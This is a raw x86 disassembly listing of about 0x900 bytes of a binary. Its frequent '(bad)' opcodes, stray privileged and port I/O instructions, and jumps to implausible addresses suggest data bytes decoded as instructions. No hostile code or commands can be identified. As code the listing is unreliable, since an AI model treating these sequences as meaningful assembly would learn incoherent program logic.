  418ab2:	adc    eax,0x15c1b36b
  418ab7:	inc    esp
  418ab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ab9:	lahf   
  418aba:	or     al,0x50
  418abc:	mov    ds:0x5400189f,eax
  418ac1:	xchg   edx,eax
  418ac2:	pop    ss
  418ac3:	je     0x418ac5
	...
  418ad5:	add    BYTE PTR [eax],al
  418ad7:	add    BYTE PTR [edx-0x74],dl
  418ada:	sub    eax,0x2b9d8c63
  418adf:	jb     0x418b59
  418ae1:	in     eax,dx
  418ae2:	and    eax,0x2aff7171
  418ae7:	pop    edi
  418ae8:	jno    0x418a7a
  418aea:	or     al,0x50
  418aec:	ins    DWORD PTR es:[edi],dx
  418aed:	ficom  WORD PTR [edi]
  418aef:	jne    0x418b54
  418af1:	fist   WORD PTR [eax+eax*1]
  418af4:	push   esp
  418af5:	rcl    BYTE PTR [edi],cl
  418af7:	je     0x418b41
  418af9:	aam    0x16
  418afb:	dec    esi
  418afc:	sub    eax,0x5f0015e0
  418b01:	retf   0x7412
  418b04:	and    ecx,esp
  418b06:	push   ss
  418b07:	arpl   WORD PTR [eax+0x2e],ax
  418b0a:	sub    al,0x66
  418b0c:	xor    dl,BYTE PTR [esp+eax*4-0x707eb2e2]
  418b13:	jecxz  0x418af1
  418b15:	imul   eax,DWORD PTR [ebp-0x6e8a06f1],0x1e
  418b1c:	fmul   DWORD PTR [ebp-0x63]
  418b1f:	pxor   mm0,QWORD PTR [esi+0x58e01e85]
  418b26:	(bad)  
  418b27:	adc    ecx,esi
  418b29:	jb     0x418ab3
  418b2b:	daa    
  418b2c:	out    dx,eax
  418b2d:	xchg   edi,ebx
  418b2f:	ss loope 0x418ba4
  418b32:	pop    ebx
  418b33:	sbb    ebp,ebx
  418b35:	xchg   BYTE PTR [eax+esi*1-0x36],al
  418b39:	pusha  
  418b3a:	das    
  418b3b:	cmp    eax,DWORD PTR [eax]
	...
  418b4d:	add    BYTE PTR [eax],al
  418b4f:	add    bl,bl
  418b51:	xchg   BYTE PTR [eax+esi*1-0x33],al
  418b55:	dec    ebx
  418b56:	adc    DWORD PTR [ecx-0x2e],ecx
  418b59:	pusha  
  418b5a:	wrmsr  
  418b5c:	mov    ebp,0x9d293b6d
  418b61:	xchg   esp,eax
  418b62:	aaa    
  418b63:	and    ebx,DWORD PTR [ebp+0x7d38df80]
  418b69:	jno    0x418b7c
  418b6b:	add    al,0x5c
  418b6d:	imul   edx,DWORD PTR [ecx],0x18
  418b70:	mov    WORD PTR [esi+edx*1+0x4],fs
  418b74:	pop    esp
  418b75:	adc    BYTE PTR [edi],0x36
  418b78:	mov    WORD PTR [edi+0x12],fs
  418b7b:	cmp    al,0x8c
  418b7d:	test   cl,dh
  418b7f:	and    dh,BYTE PTR [edx+0x6d]
  418b82:	fld    TBYTE PTR [eax]
  418b84:	pop    ebp
  418b85:	stos   BYTE PTR es:[edi],al
  418b86:	out    0x20,eax
  418b88:	cmp    BYTE PTR [ebx+edi*4-0x9ba7b7],dl
  418b8f:	dec    eax
  418b90:	xor    al,0x84
  418b92:	(bad)  [edx]
  418b94:	ds jno 0x418b48
  418b97:	add    edi,DWORD PTR ds:0x7bcf086b
  418b9d:	and    DWORD PTR [edi-0x45],0xbd4e5864
  418ba4:	pop    edi
  418ba5:	mov    ah,0x4b
  418ba7:	mov    eax,ds:0x9b65689f
  418bac:	mov    ah,0x86
  418bae:	push   esp
  418baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bb0:	ret    
  418bb1:	sub    BYTE PTR fs:[eax+eax*1+0x0],ch
	...
  418bc5:	add    BYTE PTR [eax],al
  418bc7:	add    BYTE PTR [edi-0x7e719b7c],al
  418bcd:	jne    0x418c49
  418bcf:	xchg   ebp,eax
  418bd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bd1:	addr16 jp 0x418b56
  418bd4:	add    BYTE PTR [edi+eiz*2+0x4358a54a],0x27
  418bdc:	shl    DWORD PTR [eax+0x65],cl
  418bdf:	inc    esi
  418be0:	ins    BYTE PTR es:[edi],dx
  418be1:	push   esi
  418be2:	addr16 pop ebx
  418be4:	sub    eax,0x8ffd3ac4
  418be9:	push   esi
  418bea:	jnp    0x418c21
  418bec:	test   BYTE PTR [edi+0x66],ah
  418bef:	cmp    cl,BYTE PTR [eax+0x74476563]
  418bf5:	jg     0x418c5e
  418bf7:	sbb    esp,DWORD PTR [ebp+0x58]
  418bfa:	dec    esi
  418bfb:	xor    eax,0x114bb4c0
  418c00:	cwde   
  418c01:	push   0x86a51b65
  418c06:	push   esp
  418c07:	sbb    DWORD PTR [edx-0x53ef9199],ebx
  418c0d:	jne    0x418c88
  418c0f:	jmp    0xfabae5b3
  418c14:	jbe    0x418c7d
  418c16:	jp     0x418be5
  418c18:	(bad)  
  418c19:	fisub  DWORD PTR fs:[bp+si+0x657f]
  418c1f:	fld    TBYTE PTR [ebx+0x60]
  418c22:	outs   dx,DWORD PTR ds:[esi]
  418c23:	fldenv [esp+edx*4+0x40]
  418c27:	add    dl,bl
  418c29:	mov    ds:0x7c,al
	...
  418c3e:	add    BYTE PTR [eax],al
  418c40:	stc    
  418c41:	mov    dh,0x6b
  418c43:	imul   ecx,ebx,0xd76f5895
  418c49:	mov    eax,ds:0x98fb4908
  418c4e:	jl     0x418cb9
  418c50:	adc    al,0x99
  418c52:	pop    eax
  418c53:	popa   
  418c54:	and    DWORD PTR [ebp-0x5adeb9f8],ebx
  418c5a:	push   edi
  418c5b:	imul   esi,ecx,0x187826ac
  418c61:	cdq    
  418c62:	or     BYTE PTR [ebx+esi*1-0x61],bl
  418c66:	ins    DWORD PTR es:[edi],dx
  418c67:	addr16 add al,0xa1
  418c6a:	imul   esi,DWORD PTR [ebx],0x6e6df365
  418c70:	fcom   QWORD PTR [eax-0x492ba9ac]
  418c76:	dec    esp
  418c77:	jns    0x418c47
  418c79:	mov    cl,0x54
  418c7b:	inc    ebx
  418c7c:	fidiv  DWORD PTR [esi-0x3b2d9692]
  418c82:	push   edi
  418c83:	gs data16 lahf 
  418c86:	ins    DWORD PTR es:[edi],dx
  418c87:	outs   dx,DWORD PTR ds:[esi]
  418c88:	pop    ebx
  418c89:	lahf   
  418c8a:	or     BYTE PTR [esi+edx*2-0x4f],bl
  418c8e:	ja     0x418d03
  418c90:	pushf  
  418c91:	mov    bl,0x66
  418c93:	jae    0x418c8a
  418c95:	mov    edi,0x9ba16663
  418c9a:	push   ebp
  418c9b:	jb     0x418c1d
  418c9d:	les    ebx,FWORD PTR [esi+0x61]
  418ca0:	fwait
  418ca1:	dec    esp
  418ca2:	jge    0x418d0f
	...
  418cb8:	nop
  418cb9:	les    edx,FWORD PTR [edi+0x65]
  418cbc:	xchg   BYTE PTR [ecx-0x52dc9a86],ah
  418cc2:	or     BYTE PTR [ebx-0x26],al
  418cc5:	mov    dl,0x6e
  418cc7:	imul   ecx,DWORD PTR [edx+ecx*8-0x20d2b018],0xdf590010
  418cd2:	sbb    al,0x72
  418cd4:	sub    eax,0x8c502131
  418cd9:	pop    ds
  418cda:	sbb    al,0x67
  418cdc:	and    al,dl
  418cde:	sbb    ebp,DWORD PTR [esi]
  418ce0:	adc    al,0x20
  418ce2:	adc    eax,0x3d2fe800
  418ce7:	push   eax
  418ce8:	ficomp WORD PTR [eax]
  418cea:	sbb    al,0x68
  418cec:	mov    WORD PTR [ebx],?
  418cee:	push   ds
  418cef:	jno    0x418cd5
  418cf1:	sbb    dl,BYTE PTR [edx]
  418cf3:	je     0x418ce6
  418cf5:	mov    DWORD PTR [eax],0x3bedf06b
  418cfb:	arpl   si,bx
  418cfd:	jg     0x418d2d
  418cff:	jb     0x418c8d
  418d01:	mov    eax,0x47be631b
  418d06:	sub    DWORD PTR [ebx-0x57],ebp
  418d09:	in     eax,dx
  418d0a:	cmp    BYTE PTR [edi-0x41],bl
  418d0d:	pop    edx
  418d0e:	(bad)  
  418d10:	mov    esi,0xa0460c49
  418d15:	mov    ebp,0xb99e6d3c
  418d1a:	or     al,0x51
	...
  418d30:	stos   DWORD PTR es:[edi],eax
  418d31:	dec    edi
  418d32:	adc    BYTE PTR [ebp-0x53],dh
  418d35:	fwait
  418d36:	sub    eax,0x19b4f5c
  418d3b:	arpl   WORD PTR [esi-0x3f],di
  418d3e:	das    
  418d3f:	arpl   WORD PTR [esi-0x46],bp
  418d42:	adc    DWORD PTR [ecx+ebp*2-0x63],esi
  418d46:	sbb    eax,0x1ba47862
  418d4b:	push   0x5c08fb69
  418d50:	dec    esi
  418d51:	xchg   esp,eax
  418d52:	adc    BYTE PTR [ecx+0x65],cl
  418d55:	xchg   esp,eax
  418d56:	frstor [esi]
  418d58:	inc    esp
  418d59:	xchg   esp,eax
  418d5a:	rcr    DWORD PTR [edx],0x38
  418d5d:	imul   ecx,eax,0x21
  418d60:	das    
  418d61:	jl     0x418d58
  418d63:	daa    
  418d64:	cmp    eax,0x1d20b794
  418d69:	add    ch,0x22
  418d6c:	aaa    
  418d6d:	jno    0x418d4e
  418d6f:	ss sbb eax,0x3321b171
  418d75:	imul   eax,DWORD PTR [ebx+eax*1+0x149275dc],0x279167f9
  418d80:	mov    WORD PTR [esi+esi*2+0x15],fs
  418d84:	clc    
  418d85:	xchg   esp,eax
  418d86:	xchg   edx,eax
  418d87:	and    dl,dh
  418d89:	cmp    BYTE PTR [esi+0x22],0xde
  418d8d:	jno    0x418d2a
  418d8f:	inc    esi
  418d90:	aam    0x84
  418d92:	and    BYTE PTR [ecx],0x0
	...
  418da5:	add    BYTE PTR [eax],al
  418da7:	add    al,cl
  418da9:	sbb    BYTE PTR [eax+0x16],0xaf
  418dad:	pop    eax
  418dae:	xor    ch,BYTE PTR [ecx]
  418db0:	mov    ebp,0xaa1f4883
  418db5:	sbb    edi,0x2f
  418db8:	iret   
  418db9:	jl     0x418dea
  418dbb:	and    eax,0x1d3150ba
  418dc0:	call   0x4882:0xb02fdf71
  418dc7:	push   ss
  418dc8:	scas   eax,DWORD PTR es:[edi]
  418dc9:	sbb    ebp,0x19
  418dcc:	jge    0x418d62
  418dce:	rcl    DWORD PTR [ebx],0x63
  418dd1:	adc    DWORD PTR [edx],0x17
  418dd4:	imul   eax,DWORD PTR [edx-0x456c1df5],0xb4ebe1bf
  418dde:	ret    
  418ddf:	add    edi,DWORD PTR ds:0x740f0867
  418de5:	and    DWORD PTR [edi-0x5],0xe14b58a4
  418dec:	lahf   
  418ded:	push   edi
  418dee:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  418df0:	popf   
  418df1:	outs   dx,DWORD PTR ds:[esi]
  418df2:	jle    0x418dc0
  418df4:	(bad)  
  418df5:	push   ebx
  418df6:	jo     0x418dd1
  418df8:	push   0x88bb4c66
  418dfd:	jle    0x418e6a
  418dff:	sahf   
  418e00:	imul   esp,DWORD PTR [bp+di-0x34],0xbb6b658f
  418e08:	jns    0x418e7d
  418e0a:	jp     0x418df5
	...
  418e20:	les    eax,FWORD PTR [ebx+0x55c19b6b]
  418e26:	arpl   WORD PTR [edi+ecx*4-0x6165989c],cx
  418e2d:	jg     0x418e94
  418e2f:	jnp    0x418de4
  418e31:	xchg   esp,eax
  418e32:	push   ebp
  418e33:	cdq    
  418e34:	test   al,0x83
  418e36:	jns    0x418eb6
  418e38:	jp     0x418dbc
  418e3a:	ins    BYTE PTR es:[edi],dx
  418e3b:	jmp    0x4cbbfc0b
  418e40:	outs   dx,DWORD PTR ds:[esi]
  418e41:	and    BYTE PTR [ebp+0x5b],0x91
  418e45:	xchg   esp,eax
  418e46:	pop    ecx
  418e47:	inc    esi
  418e48:	jb     0x418dca
  418e4a:	jge    0x418e94
  418e4c:	sahf   
  418e4d:	jno    0x418ea3
  418e4f:	aaa    
  418e50:	iret   
  418e51:	dec    esp
  418e52:	sub    BYTE PTR [edx],bl
  418e54:	sub    DWORD PTR [esi+0x7c],0x3e
  418e58:	jno    0x418ddc
  418e5a:	imul   ecx,DWORD PTR ds:0x1a6768cf,0xffffff9f
  418e61:	ins    DWORD PTR es:[edi],dx
  418e62:	imul   esp,DWORD PTR [edi],0x2f5464c4
  418e68:	mov    ah,0x64
  418e6a:	inc    edi
  418e6b:	or     ch,BYTE PTR [edi-0x7cff8499]
  418e71:	pushf  
  418e72:	ja     0x418e74
  418e74:	stos   DWORD PTR es:[edi],eax
  418e75:	pushf  
  418e76:	js     0x418ecb
  418e78:	mov    BYTE PTR [edx-0x6e289a82],ah
  418e7e:	dec    esi
  418e7f:	je     0x418e66
  418e81:	mov    esp,0x6577
	...
  418e96:	add    BYTE PTR [eax],al
  418e98:	out    0xb7,eax
  418e9a:	push   ebp
  418e9b:	ins    DWORD PTR es:[edi],dx
  418e9c:	enter  0x4e91,0x74
  418ea0:	aad    0xc1
  418ea2:	push   ebp
  418ea3:	jae    0x418e8b
  418ea5:	sahf   
  418ea6:	arpl   WORD PTR [edx-0x37],si
  418ea9:	xchg   ecx,eax
  418eaa:	push   ebx
  418eab:	inc    esi
  418eac:	fldenv [ecx-0x5d299ea8]
  418eb2:	jnp    0x418f23
  418eb4:	daa    
  418eb5:	lods   eax,DWORD PTR ds:[esi]
  418eb6:	or     BYTE PTR [esi+0x19],al
  418eb9:	mov    eax,ds:0xac17694c
  418ebe:	addr16 je 0x418eb3
  418ec1:	mov    ds:0xb606007d,eax
  418ec6:	dec    esi
  418ec7:	push   esp
  418ec8:	cli    
  418ec9:	dec    edi
  418eca:	pop    edx
  418ecb:	inc    ebp
  418ecc:	add    DWORD PTR [edi-0x3dbab7b9],esi
  418ed2:	arpl   WORD PTR [esi-0x17],sp
  418ed5:	lahf   
  418ed6:	push   ebp
  418ed7:	jb     0x418ea1
  418ed9:	les    ecx,FWORD PTR [esi+0x6c]
  418edc:	int3   
  418edd:	xchg   esi,eax
  418ede:	imul   ebx,DWORD PTR [esp+eiz*2-0x4d],0x67
  418ee3:	outs   dx,DWORD PTR ds:[esi]
  418ee4:	push   0x35737c96
  418ee9:	les    esp,FWORD PTR [ebx+0x66]
  418eec:	pop    ecx
  418eed:	lahf   
  418eee:	push   ebp
  418eef:	jb     0x418eb9
  418ef1:	les    ecx,FWORD PTR [esi+0x54]
  418ef4:	lds    edx,FWORD PTR [ebx+0x64]
  418ef7:	imul   ecx,DWORD PTR [eax+0x5c7c96],0x0
	...
  418f0d:	add    BYTE PTR [eax],al
  418f0f:	add    BYTE PTR [edx+edi*4-0x65968bef],cl
  418f16:	or     al,0x51
  418f18:	jnp    0x418e9f
  418f1a:	adc    BYTE PTR [ebp+0x6d],dh
  418f1d:	stc    
  418f1e:	sub    eax,0x2e8e3f5c
  418f23:	je     0x418f59
  418f25:	xor    eax,0xcf337214
  418f2a:	dec    edx
  418f2b:	push   esp
  418f2c:	pop    esp
  418f2d:	sub    dl,BYTE PTR ds:0x1ccd3167
  418f33:	pop    esp
  418f34:	pop    edi
  418f35:	aam    0x1c
  418f37:	arpl   WORD PTR [edi],bx
  418f39:	jmp    0x418f0d
  418f3b:	ins    BYTE PTR es:[edi],dx
  418f3c:	and    al,0xca
  418f3e:	or     BYTE PTR [esi],ch
  418f40:	sub    ecx,edi
  418f42:	adc    al,0x0
  418f44:	sub    bh,BYTE PTR [edi]
  418f46:	sbb    DWORD PTR [ebp+ebp*8+0xe],ebp
  418f4a:	sbb    eax,0x2d0ef32e
  418f4f:	add    al,bl
  418f51:	inc    edx
  418f52:	cmp    DWORD PTR [ecx-0x1d],edx
  418f55:	sbb    ebx,DWORD PTR ds:0x2e6fed75
  418f5b:	pop    esp
  418f5c:	enter  0x1704,0x63
  418f60:	out    dx,eax
  418f61:	jno    0x418f77
  418f63:	jb     0x418f3a
  418f65:	fnsave [ebx]
  418f67:	jo     0x418f2a
  418f69:	dec    esi
  418f6a:	or     al,0x5c
  418f6c:	fild   WORD PTR [ebp+0x29]
  418f6f:	jb     0x418f22
  418f71:	popa   
  418f72:	aaa    
  418f73:	arpl   WORD PTR [eax],ax
	...
  418f85:	add    BYTE PTR [eax],al
  418f87:	add    BYTE PTR [eax-0x4c91eeb7],bh
  418f8d:	scas   al,BYTE PTR es:[edi]
  418f8e:	(bad)  
  418f8f:	pusha  
  418f90:	scas   eax,DWORD PTR es:[edi]
  418f91:	scas   al,BYTE PTR es:[edi]
  418f92:	or     al,0x5c
  418f94:	mov    edi,0xa9722955
  418f99:	pop    ecx
  418f9a:	aaa    
  418f9b:	arpl   WORD PTR [eax+0x721b1394],ax
  418fa1:	jnp    0x418fb5
  418fa3:	sub    eax,0x2ccf53ab
  418fa8:	mov    edi,0x5d2102c2
  418fad:	xchg   esp,eax
  418fae:	sub    esi,DWORD PTR [ecx]
  418fb0:	je     0x419027
  418fb2:	icebp  
  418fb3:	es jo  0x418ffd
  418fb6:	add    al,0x18
  418fb8:	pop    eax
  418fb9:	jge    0x418fb0
  418fbb:	and    al,0x3d
  418fbd:	ret    0x12d2
  418fc0:	xor    BYTE PTR [ebp-0x25],bh
  418fc3:	mov    WORD PTR es:[eax-0x4e],ss
  418fc7:	sbb    edx,DWORD PTR [ebx+0x66]
  418fca:	int3   
  418fcb:	daa    
  418fcc:	cmp    eax,0x2b17b379
  418fd1:	or     dh,0x10
  418fd4:	cmp    DWORD PTR [ebp-0x56cf2c62],esp
  418fda:	cmc    
  418fdb:	adc    bl,bh
  418fdd:	sbb    BYTE PTR [eax-0x4c6b10e9],0x40
  418fe4:	jmp    0xef681563
  418fe9:	push   edi
  418fea:	pushf  
  418feb:	adc    eax,DWORD PTR [eax]
	...
  418ffd:	add    BYTE PTR [eax],al
  418fff:	add    BYTE PTR [edi+eax*2+0x6bd8259e],ch
  419006:	adc    BYTE PTR [ecx],0xef
  419009:	xchg   esp,eax
  41900a:	mov    esp,DWORD PTR [esi]
  41900c:	mov    bl,0x64
  41900e:	lea    edx,[edi]
  419010:	mov    esp,0xb01a5494
  419015:	jns    0x419057
  419017:	adc    al,0x6a
  419019:	jns    0x419072
  41901b:	and    DWORD PTR [edi+eiz*2+0x67af1048],ecx
  419022:	sbb    eax,0xdf68c320
  419027:	push   ss
  419028:	mov    bl,0x68
  41902a:	or     BYTE PTR [ebx+edi*2-0x3e],cl
  41902e:	pop    edi
  41902f:	aas    
  419030:	test   eax,0xad355494
  419035:	push   ebx
  419036:	js     0x41906e
  419038:	mov    cl,0x66
  41903a:	imul   esi,DWORD PTR ds:0x196777b4,0x4e
  419041:	dec    eax
  419042:	pop    eax
  419043:	jmp    0x158ff1e2
  419048:	lahf   
  419049:	mov    bl,0x5a
  41904b:	sub    al,0xa4
  41904d:	pusha  
  41904e:	imul   ecx,DWORD PTR [eax],0xffffffa0
  419051:	dec    ecx
  419052:	fld    TBYTE PTR [si-0x6c]
  419056:	aas    
  419057:	iret   
  419058:	mov    ds:0x9bc56768,al
  41905d:	inc    esp
  41905e:	addr16 aad 0x87
  419061:	xchg   esp,eax
  419062:	dec    esp
  419063:	enter  0x0,0x0
	...
  419077:	add    BYTE PTR [ebx-0x7e2fb3ad],dl
  41907d:	xchg   esp,eax
  41907e:	pop    eax
  41907f:	enter  0x657a,0x7d
  419083:	mov    esi,0xb10878a1
  419088:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419089:	arpl   WORD PTR [edi+ebp*4-0x50],di
  41908d:	jge    0x4190fa
  41908f:	jmp    0x9bacf450
  419094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419095:	push   ecx
  419096:	arpl   WORD PTR [edi+ecx*4+0x768c6b46],cx
  41909d:	push   0x6670ad6b
  4190a2:	imul   ecx,DWORD PTR [edx+0x607a7f9b],0xffffff88
  4190a9:	inc    esp
  4190aa:	gs pop ebx
  4190ac:	pushf  
  4190ad:	bound  edi,QWORD PTR [ebx+0x44]
  4190b0:	push   0x75
  4190b2:	jp     0x41909d
  4190b4:	int    0x43
  4190b6:	pop    eax
  4190b7:	add    BYTE PTR [edi-0x73],ah
  4190ba:	jl     0x41912b
  4190bc:	(bad)  
  4190bd:	lea    esp,[eax+eax*1+0x76]
  4190c1:	lea    ebp,[esi+0x74]
  4190c4:	ret    0x7ab7
  4190c7:	gs dec ecx
  4190c9:	stos   DWORD PTR es:[edi],eax
  4190ca:	push   ebp
  4190cb:	jb     0x41906e
  4190cd:	(bad)  
  4190ce:	data16 and BYTE PTR [ebp-0x78949276],dh
  4190d5:	lahf   
  4190d6:	add    BYTE PTR fs:[ecx+0x4236c9],ch
	...
  4190ed:	add    BYTE PTR [eax],al
  4190ef:	add    BYTE PTR [esp+eax*4+0x4e],bh
  4190f3:	je     0x4190ca
  4190f5:	retf   
  4190f6:	ins    DWORD PTR es:[edi],dx
  4190f7:	outs   dx,BYTE PTR ds:[esi]
  4190f8:	mov    WORD PTR [eax-0x6ef9bbba],ds
  4190fe:	jl     0x419165
  419100:	(bad)  
  419101:	retf   
  419102:	ins    DWORD PTR es:[edi],dx
  419103:	outs   dx,BYTE PTR ds:[esi]
  419104:	int3   
  419105:	xchg   ebp,eax
  419106:	push   esp
  419107:	dec    esi
  419108:	shl    BYTE PTR [ecx-0x7c438db4],1
  41910e:	imul   eax,DWORD PTR [eax],0x7377b8f5
  419114:	repnz mov ?,WORD PTR [edx+0x64]
  419118:	jne    0x4190be
  41911a:	jp     0x419188
  41911c:	jne    0x4190c2
  41911e:	ja     0x419185
  419120:	pop    ss
  419121:	stos   DWORD PTR es:[edi],eax
  419122:	push   ebp
  419123:	ins    DWORD PTR es:[edi],dx
  419124:	add    BYTE PTR [ebp-0x5e1590a6],dl
  41912a:	dec    esp
  41912b:	imul   esp,edi,0xa7467b4
  419131:	xchg   DWORD PTR [ebp+0x0],edi
  419134:	cmc    
  419135:	lea    edi,[edx+0x74]
  419138:	xor    eax,0xe16663aa
  41913d:	adc    DWORD PTR [ebp+0x72],0xffffffd0
  419141:	mov    esp,0x508c6f57
  419146:	sbb    BYTE PTR [eax+0x6c],ch
  419149:	lods   eax,DWORD PTR ds:[esi]
  41914a:	adc    DWORD PTR [esi-0x57],esi
  41914d:	lods   eax,DWORD PTR ds:[esi]
  41914e:	in     al,dx
  41914f:	push   ebx
  419150:	mov    cl,0x5e
  419152:	adc    al,0x6e
	...
  419168:	mov    ds:0x75650f57,eax
  41916d:	pop    eax
  41916e:	sbb    ebx,DWORD PTR [ebx+ebx*2-0x60]
  419172:	cs inc esp
  419174:	jle    0x4190fa
  419176:	sbb    ah,BYTE PTR [ebx+0x50]
  419179:	mov    esi,0x987a6e0f
  41917e:	sub    esi,DWORD PTR [ebp+esi*2-0x76]
  419182:	adc    dh,BYTE PTR [ecx-0x74]
  419185:	mov    ss,WORD PTR ds:0x1ea05a72
  41918b:	push   esp
  41918c:	inc    ebp
  41918d:	jmp    0x4191a4
  41918f:	add    BYTE PTR [edx+0x2f],cl
  419192:	cmp    DWORD PTR [eax],esp
  419194:	dec    edi
  419195:	inc    edx
  419196:	das    
  419197:	push   esp
  419198:	pop    esi
  419199:	cmp    bh,BYTE PTR ds:0x39275200
  41919f:	inc    ecx
  4191a0:	push   ebx
  4191a1:	sub    DWORD PTR [ecx],ecx
  4191a3:	cs sbb al,0x2d
  4191a6:	daa    
  4191a7:	add    BYTE PTR [eax],dh
  4191a9:	or     ebx,DWORD PTR [ebx]
  4191ab:	ins    DWORD PTR es:[edi],dx
  4191ac:	repnz aam 0x1c
  4191af:	arpl   di,di
  4191b1:	std    
  4191b2:	mov    edi,DWORD PTR [ebx+0x78]
  4191b5:	jmp    FWORD PTR [esi-0x4f]
  4191b8:	fs adc eax,0x166bad1c
  4191be:	add    eax,0xcfd3dc74
  4191c3:	sub    al,0x8c
  4191c5:	add    eax,0x6adc7405
  4191ca:	ret    
  4191cb:	sub    al,0x0
	...
  4191dd:	add    BYTE PTR [eax],al
  4191df:	add    BYTE PTR [ebx-0x3],bh
  4191e2:	es je  0x4191a1
  4191e5:	xchg   esp,eax
  4191e6:	sub    ecx,ebx
  4191e8:	push   0xaf144694
  4191ed:	bound  eax,QWORD PTR [eax+0x4]
  4191f0:	mov    eax,ds:0x72203575
  4191f5:	js     0x419237
  4191f7:	adc    BYTE PTR [edi+ecx*2+0x68aa1912],cl
  4191fe:	and    edi,DWORD PTR ss:[esi+0x79]
  419202:	add    edi,DWORD PTR [ecx]
  419204:	jl     0x41927f
  419206:	adc    DWORD PTR [ebx],esp
  419208:	lods   al,BYTE PTR ds:[esi]
  419209:	inc    ebx
  41920a:	push   es
  41920b:	and    bh,BYTE PTR [eax+0x67]
  41920e:	add    BYTE PTR [esi],dl
  419210:	outs   dx,DWORD PTR ds:[esi]
  419211:	xchg   esp,eax
  419212:	adc    esp,DWORD PTR [ebx]
  419214:	pop    ebp
  419215:	push   0x62733fbf
  41921a:	or     al,0x25
  41921c:	pop    eax
  41921d:	jg     0x419210
  41921f:	or     bh,BYTE PTR [ebp-0x6c]
  419222:	adc    esp,DWORD PTR [ebx]
  419224:	cmp    eax,0x2a3aff68
  419229:	arpl   bx,bx
  41922b:	and    ah,BYTE PTR [eax]
  41922d:	cmp    bh,0x33
  419230:	dec    ebx
  419231:	push   0x645103c7
  419236:	les    edx,FWORD PTR ds:0x2fb7be3b
  41923c:	inc    edi
  41923d:	pusha  
  41923e:	fwait
  41923f:	adc    al,0xf4
  419241:	jns    0x4191f6
  419243:	pop    ss
	...
  419258:	loopne 0x4192d9
  41925a:	(bad)  
  41925b:	push   ds
  41925c:	jmp    0x8081:0xe7188250
  419263:	sbb    eax,esi
  419265:	xchg   esp,eax
  419266:	sahf   
  419267:	sbb    bl,ch
  419269:	jns    0x4191f0
  41926b:	paddusb mm4,QWORD PTR [ebx+0x71]
  41926f:	adc    ebp,ebx
  419271:	mov    esi,0x7ea68b08
  419276:	or     BYTE PTR [ebp+0x2b6b75ce],cl
  41927c:	jns    0x4192c6
  41927e:	or     BYTE PTR [edx],bh
  419280:	fwait
  419281:	jbe    0x4192ff
  419283:	pop    esi
  419284:	jno    0x4192e8
  419286:	imul   ebp,DWORD PTR ds:0x2b6b75c9,0x59
  41928d:	dec    eax
  41928e:	or     BYTE PTR [esi+ebx*2],ch
  419291:	inc    ebx
  419292:	or     BYTE PTR [edx],bl
  419294:	ret    
  419295:	push   esi
  419296:	pop    esp
  419297:	push   ss
  419298:	dec    ecx
  419299:	inc    edx
  41929a:	dec    ebx
  41929b:	inc    ebp
  41929c:	dec    edi
  41929d:	and    BYTE PTR [edi+0x1a],0x9f
  4192a1:	jae    0x41931c
  4192a3:	xor    eax,0x478679c
  4192a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192a9:	ja     0x419315
  4192ab:	and    eax,0xb84a5587
  4192b0:	xchg   ecx,eax
  4192b1:	mov    ds:0xbb89b949,al
  4192b6:	xor    BYTE PTR [ecx+0x1d23a2d0],bh
	...
  4192d0:	push   ecx
  4192d1:	scas   eax,DWORD PTR es:[edi]
  4192d2:	dec    ecx
  4192d3:	or     al,0x4e
  4192d5:	push   ebp
  4192d6:	dec    esi
  4192d7:	sbb    al,0xc5
  4192d9:	mov    ds:0xa2d1a837,al
  4192de:	dec    ebx
  4192df:	sti    
  4192e0:	retf   0x3d58
  4192e3:	test   dl,0x69
  4192e6:	or     BYTE PTR [edx-0x69a3a93e],bl
  4192ec:	enter  0x4b42,0xc5
  4192f0:	into   
  4192f1:	and    BYTE PTR [edi-0x66],0x9e
  4192f5:	jno    0x419370
  4192f7:	mov    ch,0xbb
  4192f9:	gs js  0x419280
  4192fc:	fwait
  4192fd:	jne    0x419369
  4192ff:	add    BYTE PTR [ecx],dh
  419301:	fwait
  419302:	cmp    eax,0x39c52445
  419307:	xor    eax,0x4521e107
  41930c:	add    al,0xc4
  41930e:	ss sub eax,0x3739dd99
  419314:	adc    BYTE PTR [edx+0x47],0x37
  419318:	jl     0x4192e5
  41931a:	dec    ecx
  41931b:	xor    al,0x7d
  41931d:	ret    0x4639
  419320:	(bad)  
  419321:	enter  0x333b,0x17
  419325:	push   ebx
  419326:	jno    0x419328
  419328:	retf   0x778f
  41932b:	gs dec ebx
  41932d:	test   BYTE PTR [eax+0x73],bh
  419330:	xchg   edi,eax
  419331:	sahf   
  419332:	ja     0x419362
	...
  419348:	pushf  
  419349:	xchg   BYTE PTR [ebp+0x0],ch
  41934c:	mov    cl,BYTE PTR [edi-0x7b749a89]
  419352:	js     0x419382
  419354:	jl     0x4192dc
  419356:	ins    DWORD PTR es:[edi],dx
  419357:	add    BYTE PTR [ebx-0x6da9a75c],ch
  41935d:	lahf   
  41935e:	push   ebp
  41935f:	mov    BYTE PTR [bp+si+0x6626],al
  419364:	fld    DWORD PTR [ecx-0x5e06b9f8]
  41936a:	pop    esi
  41936b:	outs   dx,DWORD PTR ds:[esi]
  41936c:	mov    esp,0xc7656bb8
  419371:	(bad)  
  419372:	arpl   WORD PTR gs:[ebp-0x4397a54b],sp
  419379:	xchg   DWORD PTR [ebx+0x53],esp
  41937c:	push   edx
  41937d:	(bad)  
  41937e:	jl     0x4193ae
  419380:	push   esi
  419381:	xchg   BYTE PTR [ecx+0x0],ah
  419384:	and    eax,DWORD PTR [edx-0x72bccc89]
  41938a:	fs ins BYTE PTR es:[edi],dx
  41938c:	mov    ebx,?
  41938e:	cmp    dl,BYTE PTR [ecx-0x41]
  419391:	ds xor al,0x6e
  419394:	in     eax,0x6f
  419396:	or     DWORD PTR [esi-0x41],ecx
  419399:	or     ch,BYTE PTR [esi]
  41939b:	push   ecx
  41939c:	mov    ah,0x70
  41939e:	add    eax,0x1b66b364
  4193a3:	add    dl,cl
  4193a5:	stos   BYTE PTR es:[edi],al
  4193a6:	aaa    
  4193a7:	inc    edx
  4193a8:	lods   eax,DWORD PTR ds:[esi]
  4193a9:	dec    edx
